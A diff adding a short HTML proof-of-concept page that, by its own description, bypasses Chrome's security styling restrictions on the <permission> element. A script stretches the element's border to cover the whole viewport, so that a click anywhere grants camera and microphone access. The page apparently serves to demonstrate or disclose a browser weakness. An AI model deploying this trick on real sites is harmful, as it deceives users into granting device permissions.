@@ -1,0 +1,37 @@
+<!doctype html>
+<html lang="ja">
+  <head>
+    <title>Big unrecognizable but operable &lt;permission&gt; element</title>
+    <meta
+      name="description"
+      content="An evil example of how to get around the styling restrictions of the &lt;permission&gt; element by browsers for security reasons."
+    />
+    <style>
+      body {
+        margin: 0;
+      }
+      permission {
+        margin: 0;
+        padding: 0;
+        border-style: solid;
+      }
+    </style>
+  </head>
+  <body>
+    <!--
+      The <permission> element has styling restrictions by browsers for security reasons.
+      For example, visibility such as contrast, size, and intersection must be maintained.
+      With invalid styles, browsers will disable the element and make it inoperable.
+      This page provides an evil example of how to get around this restriction tested on Chrome 127.0.6533.100.
+    -->
+    <permission type="camera microphone">
+    <script>
+      const permission = document.querySelector("permission");
+      const computedStyle = getComputedStyle(permission);
+      const maxVerticalBorderWidth = `calc((100dvh - ${computedStyle.height}) / 2)`;
+      const naturalWidth = computedStyle.width;
+      const maxHorizontalBorderWidth = `calc((100dvw - ${computedStyle.width}) / 2)`;
+      permission.style.borderWidth = `${maxVerticalBorderWidth} ${maxHorizontalBorderWidth}`;
+    </script>
+  </body>
+</html>
